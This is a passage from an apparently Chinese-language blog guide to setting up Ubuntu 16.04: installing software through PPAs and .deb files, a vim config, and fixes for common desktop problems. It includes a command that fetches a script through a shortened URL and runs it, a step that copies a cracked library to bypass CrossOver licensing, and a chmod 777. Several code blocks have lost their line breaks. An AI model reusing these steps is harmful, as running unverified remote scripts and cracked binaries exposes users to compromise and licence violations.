如果你之前安装过proxychains,那么这时候的配置文件应该是proxychains4.conf,但是在进行以下修改的时候，两个配置文件都要修改</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530169409.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530169442.jpg" alt></p><h3 id="安装必要软件"><a href="#安装必要软件" class="headerlink" title="安装必要软件"></a>安装必要软件</h3><pre class=" language-shell"><code class="language-shell">sudo apt install vim ctags  git  gcc gdb rar diffuse shutter curl</code></pre><ul><li><code>vim</code>:强大的编辑器</li><li><code>git</code>:代码管理</li><li><code>gcc</code>,<code>gdb</code>,<code>ctags</code>:编译C语言用到</li><li><code>rar</code>:解压.rar压缩文件</li><li><code>diffuse</code>:文件比对</li><li><code>shutter</code>:一款截图软件,快捷键：shutter –select)</li><li><code>curl</code>:一般我用来测试proxychains4<h3 id="安装Oracle-Java"><a href="#安装Oracle-Java" class="headerlink" title="安装Oracle Java"></a>安装Oracle Java</h3><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:webupd8team/javasudo apt updatesudo apt install oracle-java8-installer</code></pre></li></ul><h3 id="安装WPS"><a href="#安装WPS" class="headerlink" title="安装WPS"></a>安装WPS</h3><ul><li>官网下载WPS(.deb): <a href="http://community.wps.cn/download/" target="_blank" rel="noopener">http://community.wps.cn/download/</a></li><li><code>dpkg -i 包名</code>,进行安装</li><li><code>sudo apt -f install</code>,解除依赖</li></ul><h3 id="安装网易云"><a href="#安装网易云" class="headerlink" title="安装网易云"></a>安装网易云</h3><ul><li>官网下载网易云：<a href="http://music.163.com/#/download" target="_blank" rel="noopener">http://music.163.com/#/download</a></li><li><code>dpkg -i 包名</code></li><li><code>sudo apt -f install</code></li><li>运行：<code>sudo netease-cloud-music</code></li></ul><h3 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h3><ul><li>官网下载搜狗输入法： <a href="http://pinyin.sogou.com/linux/?r=pinyin" target="_blank" rel="noopener">http://pinyin.sogou.com/linux/?r=pinyin</a></li><li><code>dpkg -i 包名</code></li><li><code>sudo apt -f install</code></li><li>重启即可<h5 id="若出现无法输入中文"><a href="#若出现无法输入中文" class="headerlink" title="若出现无法输入中文"></a>若出现无法输入中文</h5>普通用户,不用提权<pre class=" language-shell"><code class="language-shell">cd ~/.configfind . -name sogou*find . -name Sogou*</code></pre>将那三个文件干掉即可<h5 id="若想输入英文标点"><a href="#若想输入英文标点" class="headerlink" title="若想输入英文标点"></a>若想输入英文标点</h5></li><li><em>Ctrl+.*</em></li></ul><h3 id="Flatabulous主题"><a href="#Flatabulous主题" class="headerlink" title="Flatabulous主题"></a>Flatabulous主题</h3><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:noobslab/themessudo add-apt-repository ppa:noobslab/iconssudo apt updatesudo apt install flatabulous-themesudo apt install ultra-flat-iconssudo apt install unity-tweak-tool</code></pre><p>然后启动<code>unity-tweak-tool</code>,主题选择<code>Flatabulous</code>，图标选择<code>Ultra-flat</code></p><h3 id="安装CodeBlock"><a href="#安装CodeBlock" class="headerlink" title="安装CodeBlock"></a>安装CodeBlock</h3><ul><li>访问  <a href="https://launchpad.NET/~damien-moore/+archive/ubuntu/codeblocks-stable" target="_blank" rel="noopener">https://launchpad.NET/~damien-moore/+archive/ubuntu/codeblocks-stable</a></li><li>找到页面上以“ppa:”开头加粗的那一段英文，比如这次就是“ppa:damien-moore/codeblocks-stable”<pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:damien-moore/codeblocks-stablesudo apt updatesudo apt install codeblocks  libwxgtk3.0-dev wx-common codeblocks-contrib</code></pre><h5 id="无法输入中文或终端中文出现乱码"><a href="#无法输入中文或终端中文出现乱码" class="headerlink" title="无法输入中文或终端中文出现乱码"></a>无法输入中文或终端中文出现乱码</h5><pre class=" language-shell"><code class="language-shell">Settings->General Setting->Environment-Terminal to launch console programs下拉菜单改成gnome-terminal -t $TITLE -x</code></pre></li></ul><h3 id="无法正常关机重启"><a href="#无法正常关机重启" class="headerlink" title="无法正常关机重启"></a>无法正常关机重启</h3><p>方法1：系统设置-&gt; 软件和更新-&gt;附加驱动-&gt;安装专有驱动-&gt;安装完后重启，笔者就是用这种方法解决的。</p><p>方法2：</p><pre class=" language-shell"><code class="language-shell">sudo gedit /etc/modprobe.d/blacklist.conf最下面添加下列内容blacklist vga16fbblacklist nouveaublacklist rivafbblacklist nvidiafbblacklist rivatv</code></pre><p>方法3：在关机或重启前用<code>sync</code>命令</p><h3 id="系统提示-boot空间不够"><a href="#系统提示-boot空间不够" class="headerlink" title="系统提示/boot空间不够"></a>系统提示/boot空间不够</h3><pre class=" language-shell"><code class="language-shell">uname -a    //查看内核信息dpkg --get-selections|grep linux-image   过滤过期内核sudo apt purge linux-image-4.4.0-66-generic 删掉内核</code></pre><p>ps:千万不要删掉现在的内核，后果很严重</p><h3 id="安装smplayer"><a href="#安装smplayer" class="headerlink" title="安装smplayer"></a>安装smplayer</h3><pre class=" language-shell"><code class="language-shell">sudo apt install smplayer</code></pre><h3 id="安装文泉驿微字体"><a href="#安装文泉驿微字体" class="headerlink" title="安装文泉驿微字体"></a>安装文泉驿微字体</h3><pre class=" language-shell"><code class="language-shell">sudo apt install ttf-wqy-microhei</code></pre><h3 id="安装苹果启动项"><a href="#安装苹果启动项" class="headerlink" title="安装苹果启动项"></a>安装苹果启动项</h3><pre class=" language-shell"><code class="language-shell">sudo apt install docky</code></pre><h3 id="安装Android-Studio"><a href="#安装Android-Studio" class="headerlink" title="安装Android Studio"></a>安装Android Studio</h3><ul><li>翻墙去官网下载Android studio</li><li>将下载下来的文件解压到<code>home</code>目录</li><li>进入Android studio目录里面的<code>bin</code>目录</li><li>给<code>studio.sh</code>添加运行权限<pre class=" language-shell"><code class="language-shell">chmod +x studio.sh</code></pre></li><li>终端运行<pre class=" language-shell"><code class="language-shell">sh studio.sh        // 这里千万不要加sudo</code></pre></li><li>经过一系列的下载安装,在主页面选择<code>Configure →Create Desktop Entry →for all users</code></li></ul><h3 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h3><h5 id="第一种：界面好看"><a href="#第一种：界面好看" class="headerlink" title="第一种：界面好看"></a>第一种：界面好看</h5><pre class=" language-shell"><code class="language-shell">curl https://j.mp/spf13-vim3 -L > spf13-vim.sh && sh spf13-vim.sh</code></pre><h5 id="第二种：方便运行"><a href="#第二种：方便运行" class="headerlink" title="第二种：方便运行"></a>第二种：方便运行</h5><ul><li>将下列东西复制到<code>~/.vimrc</code>,然后就可以自动补全括号,<strong>F5编译,F6运行</strong></li><li>当然也可以两种方法结合，在是用了第一种方法之后，记得先去<code>~/.vimrc</code>，将其中的<code>F5</code>,<code>F6</code>快捷键用<code>&quot;</code>注释掉，然后再复制粘贴以下代码</li></ul><pre class=" language-bash"><code class="language-bash">inoremap <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>iinoremap <span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>iinoremap <span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token operator">&lt;</span>CR<span class="token operator">></span><span class="token punctuation">}</span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>Oautocmd Syntax html,vim inoremap <span class="token operator">&lt;</span> <span class="token operator">&lt;</span>lt<span class="token operator">>></span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>i<span class="token operator">|</span> inoremap <span class="token operator">></span> <span class="token operator">&lt;</span>c-r<span class="token operator">>=</span>ClosePair<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>inoremap <span class="token punctuation">)</span> <span class="token operator">&lt;</span>c-r<span class="token operator">>=</span>ClosePair<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>inoremap <span class="token punctuation">]</span> <span class="token operator">&lt;</span>c-r<span class="token operator">>=</span>ClosePair<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>inoremap <span class="token punctuation">}</span> <span class="token operator">&lt;</span>c-r<span class="token operator">>=</span>CloseBracket<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>inoremap <span class="token string">" &lt;c-r>=QuoteDelim('"</span><span class="token string">')&lt;CR>inoremap '</span> <span class="token operator">&lt;</span>c-r<span class="token operator">>=</span>QuoteDelim<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span><span class="token keyword">function</span> ClosePair<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">if</span> getline<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>col<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> - 1<span class="token punctuation">]</span> <span class="token operator">==</span> a:char <span class="token keyword">return</span> <span class="token string">"&lt;Right>"</span> <span class="token keyword">else</span> <span class="token keyword">return</span> a:char endifendf<span class="token keyword">function</span> CloseBracket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> match<span class="token punctuation">(</span>getline<span class="token punctuation">(</span>line<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> + 1<span class="token punctuation">)</span>, <span class="token string">'s*}'</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> 0 <span class="token keyword">return</span> <span class="token string">"&lt;CR>}"</span> <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string">"&lt;Esc>j0f}a"</span> endifendf<span class="token keyword">function</span> QuoteDelim<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">let</span> line <span class="token operator">=</span> getline<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token keyword">let</span> col <span class="token operator">=</span> col<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> line<span class="token punctuation">[</span>col - 2<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"\" return a:char elseif line[col - 1] == a:char return "</span><span class="token operator">&lt;</span>Right<span class="token operator">></span><span class="token string">" else return a:char.a:char."</span><span class="token operator">&lt;</span>Esc<span class="token operator">></span>i<span class="token string">" endifendf"</span> F6运行Cfunc<span class="token operator">!</span> CompileGcc<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">exec</span> <span class="token string">"w"</span>    <span class="token keyword">let</span> compilecmd<span class="token operator">=</span><span class="token string">"!gcc "</span>    <span class="token keyword">let</span> compileflag<span class="token operator">=</span><span class="token string">"-o %&lt; "</span>    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"mpi.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compilecmd <span class="token operator">=</span> <span class="token string">"!mpicc "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"glut.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -lglut -lGLU -lGL "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"cv.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -lcv -lhighgui -lcvaux "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"omp.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -fopenmp "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"math.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -lm "</span>    endif    <span class="token function">exec</span> compilecmd.<span class="token string">" % "</span>.compileflagendfuncfunc<span class="token operator">!</span> CompileGpp<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">exec</span> <span class="token string">"w"</span>    <span class="token keyword">let</span> compilecmd<span class="token operator">=</span><span class="token string">"!g++ "</span>    <span class="token keyword">let</span> compileflag<span class="token operator">=</span><span class="token string">"-o %&lt; "</span>    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"mpi.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compilecmd <span class="token operator">=</span> <span class="token string">"!mpic++ "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"glut.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -lglut -lGLU -lGL "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"cv.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -lcv -lhighgui -lcvaux "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"omp.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -fopenmp "</span>    endif    <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"math.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0        <span class="token keyword">let</span> compileflag .<span class="token operator">=</span> <span class="token string">" -lm "</span>    endif    <span class="token function">exec</span> compilecmd.<span class="token string">" % "</span>.compileflagendfuncfunc<span class="token operator">!</span> RunPython<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">exec</span> <span class="token string">"!python %"</span>endfuncfunc<span class="token operator">!</span> CompileJava<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">exec</span> <span class="token string">"!javac %"</span>endfuncfunc<span class="token operator">!</span> CompileCode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">exec</span> <span class="token string">"w"</span>        <span class="token keyword">if</span> <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"cpp"</span>                <span class="token function">exec</span> <span class="token string">"call CompileGpp()"</span>        elseif <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"c"</span>                <span class="token function">exec</span> <span class="token string">"call CompileGcc()"</span>        elseif <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"python"</span>                <span class="token function">exec</span> <span class="token string">"call RunPython()"</span>        elseif <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"java"</span>                <span class="token function">exec</span> <span class="token string">"call CompileJava()"</span>        endifendfuncfunc<span class="token operator">!</span> RunResult<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">exec</span> <span class="token string">"w"</span>        <span class="token keyword">if</span> search<span class="token punctuation">(</span><span class="token string">"mpi.h"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0            <span class="token function">exec</span> <span class="token string">"!mpirun -np 4 ./%&lt;"</span>        elseif <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"cpp"</span>            <span class="token function">exec</span> <span class="token string">"! ./%&lt;"</span>        elseif <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"c"</span>            <span class="token function">exec</span> <span class="token string">"! ./%&lt;"</span>        elseif <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"python"</span>            <span class="token function">exec</span> <span class="token string">"call RunPython"</span>        elseif <span class="token operator">&amp;</span>filetype <span class="token operator">==</span> <span class="token string">"java"</span>            <span class="token function">exec</span> <span class="token string">"!java %&lt;"</span>        endifendfuncmap <span class="token operator">&lt;</span>F5<span class="token operator">></span> :call CompileCode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>imap <span class="token operator">&lt;</span>F5<span class="token operator">></span> <span class="token operator">&lt;</span>ESC<span class="token operator">></span>:call CompileCode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>vmap <span class="token operator">&lt;</span>F5<span class="token operator">></span> <span class="token operator">&lt;</span>ESC<span class="token operator">></span>:call CompileCode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span>map <span class="token operator">&lt;</span>F6<span class="token operator">></span> :call RunResult<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>CR<span class="token operator">></span></code></pre><h3 id="安装Xmind"><a href="#安装Xmind" class="headerlink" title="安装Xmind"></a>安装Xmind</h3><ul><li>官网下载：<a href="http://www.xmind.net/download/previous/" target="_blank" rel="noopener">http://www.xmind.net/download/previous/</a></li><li><code>dpkg -i 包名</code></li></ul><h3 id="安装indicator-sysmonitor"><a href="#安装indicator-sysmonitor" class="headerlink" title="安装indicator-sysmonitor"></a>安装indicator-sysmonitor</h3><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitorsudo apt updatesudo apt install indicator-sysmonitor</code></pre><p>终端执行：<code>indicator-sysmonitor &amp;</code><br>为程序添加开机启动！鼠标右键点击标题栏上图标，弹出菜单，选择首选项  勾上<code>Run on startup</code>:， 这样就能开机启动了。切换到 Advanced 选项，可以对要显示的信息的格式进行设置。然后关闭终端,按window键搜索<code>indicator</code>,然后打开就行</p><h3 id="win10-Ubuntu双系统-发现window的盘打不开"><a href="#win10-Ubuntu双系统-发现window的盘打不开" class="headerlink" title="win10,Ubuntu双系统,发现window的盘打不开"></a>win10,Ubuntu双系统,发现window的盘打不开</h3><p>类似这样的错误:<code>Error mounting /dev/sda5</code></p><pre class=" language-shell"><code class="language-shell">sudo ntfsfix /dev/sda5</code></pre><h3 id="安装GIMP"><a href="#安装GIMP" class="headerlink" title="安装GIMP"></a>安装GIMP</h3><ul><li>号称Linux下的ps<pre class=" language-shell"><code class="language-shell">sudo apt install gimp</code></pre></li></ul><h3 id="安装护眼的f-lux"><a href="#安装护眼的f-lux" class="headerlink" title="安装护眼的f.lux"></a>安装护眼的f.lux</h3><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:nathan-renniewaldock/fluxsudo apt updatesudo apt install fluxgui</code></pre><h3 id="安装MPV播放器"><a href="#安装MPV播放器" class="headerlink" title="安装MPV播放器"></a>安装MPV播放器</h3><ul><li>相对于smplayer的另一个播放器<pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:mc3man/mpv-testssudo apt updatesudo apt install mpv</code></pre></li></ul><h3 id="提高笔记本电池寿命"><a href="#提高笔记本电池寿命" class="headerlink" title="提高笔记本电池寿命"></a>提高笔记本电池寿命</h3><pre class=" language-shell"><code class="language-shell">sudo apt install tlp tlp-rdwsudo tlp start</code></pre><h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><pre class=" language-shell"><code class="language-shell">sudo su -输入你的账户的密码passwd输入新的root密码再次输入新的root密码</code></pre><h3 id="安装Qt"><a href="#安装Qt" class="headerlink" title="安装Qt"></a>安装Qt</h3><ul><li>网站: <a href="https://www.qt.io/download-open-source/" target="_blank" rel="noopener">https://www.qt.io/download-open-source/</a><br>选择不联网的那个</li><li><em>安装的时候不要提权*</em><h5 id="安装Qt出现无法输入中文"><a href="#安装Qt出现无法输入中文" class="headerlink" title="安装Qt出现无法输入中文"></a>安装Qt出现无法输入中文</h5></li></ul><p>1.安装fcitx-frontend-qt5</p><pre class=" language-shell"><code class="language-shell">sudo apt install fcitx-frontend-qt5</code></pre><p>2.输入<code>dpkg -L fcitx-frontend-qt5</code>,找到安装路径<br>,出现<code>libfcitxplatforminputcontextplugin.so</code>的就是<br>3.将上面的文件复制到Qt安装目录,我的是</p><pre class=" language-bash"><code class="language-bash">/home/hua/Qt5.11.1/Tools/QtCreator/lib/Qt/plugins/platforminputcontexts/home/hua/Qt5.11.1/5.11.1/gcc_64/plugins/platforminputcontexts</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 所以我的命令如下</span><span class="token function">cp</span> -r /usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts/libfcitxplatforminputcontextplugin.so /home/hua/Qt5.11.1/Tools/QtCreator/lib/Qt/plugins/platforminputcontexts<span class="token function">cp</span> -r /usr/lib/x86_64-linux-gnu/qt5/plugins/platforminputcontexts/libfcitxplatforminputcontextplugin.so /home/hua/Qt5.11.1/5.11.1/gcc_64/plugins/platforminputcontexts</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 有时候可能有对`.so`文件进行提权，可`cd`到指定目录下，分别进行如下操作，如果提示没有权限就用`sudo`</span><span class="token function">chmod</span> +x libfcitxplatforminputcontextplugin.so<span class="token function">chmod</span> 777 libfcitxplatforminputcontextplugin.so</code></pre><h3 id="常用压缩包的打包和解压"><a href="#常用压缩包的打包和解压" class="headerlink" title="常用压缩包的打包和解压"></a>常用压缩包的打包和解压</h3><ul><li><p>.tar.bz</p><ul><li>解压:<code>tar jxvf 文件名.tar.bz</code></li></ul></li><li><p>.tar.gz</p><ul><li>解压:<code>tar zxvf 文件名.tar.gz</code></li><li>压缩:<code>tar zcvf 文件名.tar.gz 目标名</code></li></ul></li><li><p>.zip:</p><ul><li>解压:<code>unzip -O CP936 xxx.zip</code></li><li>压缩:<code>zip 目标文件名.zip 要压缩的东西</code>,一般都是<code>zip 目标文件名.zip ./*</code>:将当前目录下的所有东西全部压缩成 目标文件名.zip</li></ul></li><li><p>.tar:</p><ul><li>解压:<code>tar xvf 文件名.tar</code></li><li>压缩:<code>tar cvf 文件名.tar 目标名</code></li></ul></li><li><p>.rar:</p><ul><li>解压:<code>rar x 文件名.rar</code></li><li>压缩:<code>rar a 文件名.rar 目标名</code></li></ul></li></ul><h3 id="安装QQ"><a href="#安装QQ" class="headerlink" title="安装QQ"></a>安装QQ</h3><ul><li>网站:<a href="http://phpcj.org/wineqq" target="_blank" rel="noopener">http://phpcj.org/wineqq</a></li><li>准备环境<pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:wine/wine-buildssudo apt updatesudo apt install winehq-devel</code></pre></li><li>下载wineqq<br><a href="https://pan.baidu.com/s/1o8CotQU#list/path=%2F" target="_blank" rel="noopener">下载地址</a><br>提取密码:f2sn</li><li>将压缩包解压到用户主目录<pre class=" language-shell"><code class="language-shell">tar xvf wineQQ8.9.4_21584.tar.xz -C ~/</code></pre></li><li>打开qq,等待安装一些东西即可</li><li>出现方块字体<pre class=" language-shell"><code class="language-shell">PC:~winecfg//第一次运行然系统初始化好然后关闭下载好我给你们的文件（3个文件：wine−zh−fix−reg.tar.gz解压后放在一边在终端里面输入：‘PC: winecfg//第一次运行然系统初始化好然后关闭下载好我给你们的文件（3个文件：wine−zh−fix−reg.tar.gz解压后放在一边在终端里面输入：‘PC:  regedit xxx.reg //xxx.reg是解压的文件 全部都要执行该命令`再打开wine：完美解决</code></pre></li></ul><h5 id="使用CrossOver安装qq"><a href="#使用CrossOver安装qq" class="headerlink" title="使用CrossOver安装qq"></a>使用CrossOver安装qq</h5><p>1.下载安装CrossOver</p><pre class=" language-shell"><code class="language-shell">sudo dpkg --add-architecture i386sudo apt updatesudo apt install gdebiwget http://crossover.codeweavers.com/redirect/crossover.debsudo gdebi crossover.deb</code></pre><p>下载后解压出crack文件夹里面的<code>winewrapper.exe.so</code><br>拷贝到<code>/opt/cxoffice/lib/wine/</code>目录下</p><h5 id="最简单的qq安装"><a href="#最简单的qq安装" class="headerlink" title="最简单的qq安装"></a>最简单的qq安装</h5><ul><li><a href="https://github.com/askme765cs/Wine-QQ-TIM" target="_blank" rel="noopener">https://github.com/askme765cs/Wine-QQ-TIM</a></li><li>下载完成后,双击运行</li></ul><h3 id="Atom配置"><a href="#Atom配置" class="headerlink" title="Atom配置"></a>Atom配置</h3><h5 id="相关设置"><a href="#相关设置" class="headerlink" title="相关设置"></a>相关设置</h5><ul><li>Tab长度：File &gt; settings &gt; Tab Length 设置为4<h5 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h5></li><li>ctrl+shift+M：Markdown编辑环境下的分隔到右侧预览效果<h5 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h5></li><li>File &gt; settings &gt; Install &gt; Search pachages &gt;Packages &gt;Install</li><li>安装完成后会在settings &gt; Packages &gt; Community Packages中看到<h5 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h5></li><li>simplified-chinese-menu：简体中文包汉化菜单插件</li><li>file-icons:file文件图标</li><li>linter:检查错误</li><li>minimap:小地图</li><li>script:运行代码。快捷键<code>Ctrl+Shift+b</code></li><li>autocomplete-python:python代码自动补全</li><li>highlight-selected:高亮选择的词</li><li>minimap-highlight-selected:小地图高亮</li><li>nucleus-dark-ui | seti-ui:最漂亮的两个主题</li><li>atom-monokai | monokai:最漂亮的两个语法主题</li><li>markdown-img-paste:图片粘贴(Ctrl+shift+v)</li><li>markdown-preview-enhanced:中国人自己写的强大的markdown</li><li>gpp-compiler:写C语言用</li></ul><h3 id="ubuntu16-04与windows时间同步代码："><a href="#ubuntu16-04与windows时间同步代码：" class="headerlink" title="ubuntu16.04与windows时间同步代码："></a>ubuntu16.04与windows时间同步代码：</h3><p>第一种方法</p><pre class=" language-shell"><code class="language-shell">sudo timedatectl set-local-rtc 1 --adjust-system-clocksudo timedatectl set-ntp 0</code></pre><p>第二种方法</p><pre class=" language-shell"><code class="language-shell">sudo apt install ntpdatesudo ntpdate time.windows.comsudo hwclock --localtime --systohc</code></pre><h3 id="出现“无法获得锁-var-lib-apt-lists-lock”错误"><a href="#出现“无法获得锁-var-lib-apt-lists-lock”错误" class="headerlink" title="出现“无法获得锁 /var/lib/apt/lists/lock”错误"></a>出现“无法获得锁 /var/lib/apt/lists/lock”错误</h3><pre class=" language-shell"><code class="language-shell">sudo rm /var/lib/apt/lists/lock</code></pre><h3 id="Gparted"><a href="#Gparted" class="headerlink" title="Gparted"></a>Gparted</h3><ul><li>一个分区工具，它可以用于创建、删除、移动分区，调整分区大小，检查、复制分区等操作。可以用于调整分区以安装新操作系统、备份特定分区到另一块硬盘等。<pre class=" language-shell"><code class="language-shell">sudo apt install gparted -y</code></pre></li></ul><h3 id="FileZilla"><a href="#FileZilla" class="headerlink" title="FileZilla"></a>FileZilla</h3><ul><li>FileZilla是一个免费开源的FTP软件，分为客户端版本和服务器版本，具备所有的FTP软件功能。可控性、有条理的界面和管理多站点的简化方式使得Filezilla客户端版成为一个方便高效的FTP客户端工具。<pre class=" language-shell"><code class="language-shell">sudo apt install filezilla</code></pre></li></ul><h3 id="Kazam"><a href="#Kazam" class="headerlink" title="Kazam"></a>Kazam</h3><ul><li>Kazam 是 Ubuntu 上一款简易的桌面屏幕录制工具，它只能录制整个屏幕，可以录制声音，并可以快速上传录制好的视频到 YouTube 及 VideoBin 视频分享网站上</li></ul><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:and471/kazam-daily-buildssudo apt updatesudo apt install kazam</code></pre><h3 id="Silentcast"><a href="#Silentcast" class="headerlink" title="Silentcast"></a>Silentcast</h3><ul><li>Silentcast是一款专注于GIF录制工具。</li></ul><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:sethj/silentcastsudo apt updatesudo apt install silentcast</code></pre><h3 id="Okular"><a href="#Okular" class="headerlink" title="Okular"></a>Okular</h3><ul><li>Okular 是一个 PDF 文档阅读软件，支持 PDF、TIFF、CHM、ODF、EPUB、mobi 等文档格式。</li></ul><pre class=" language-shell"><code class="language-shell">sudo apt install okular -y</code></pre><h3 id="Albert-Spotlight"><a href="#Albert-Spotlight" class="headerlink" title="Albert Spotlight"></a>Albert Spotlight</h3><ul><li>Albert Spotlight是 Ubuntu的一项快速、随打即找、系统支援的桌面搜寻特色。spotlight 被设计为可以找到任何位于电脑中广泛的项目，包含文件、图片、音乐、应用程式、系统喜好设定控制台，也可以是文件或是PDF中指定的字。优雅地取代了Mac中的mac Spotlight。</li><li>在安装完成之后,打开,配置打开的快捷键即可.</li><li>民间<pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:noobslab/macbuntusudo apt updatesudo apt install albert</code></pre></li><li>官方<pre class=" language-shell"><code class="language-shell">wget -nv https://download.opensuse.org/repositories/home:manuelschneid3r/xUbuntu_16.04/Release.key -O Release.keysudo apt-key add - < Release.keysudo sh -c "echo 'deb http://download.opensuse.org/repositories/home:/manuelschneid3r/xUbuntu_16.04/ /' > /etc/apt/sources.list.d/albert.list"sudo apt updatesudo apt install albert</code></pre></li></ul><h3 id="enca"><a href="#enca" class="headerlink" title="enca"></a>enca</h3><ul><li>enca文件编码转换工具。</li></ul><pre class=" language-shell"><code class="language-shell">sudo apt install enca</code></pre><pre><code>#enca查看文件编码enca filename</code></pre><h3 id="Figlet"><a href="#Figlet" class="headerlink" title="Figlet"></a>Figlet</h3><ul><li>Figlet是一个将字符串在终端生成一个logo的终端工具。</li></ul><pre class=" language-shell"><code class="language-shell">sudo apt install figlet</code></pre><h3 id="Wingware"><a href="#Wingware" class="headerlink" 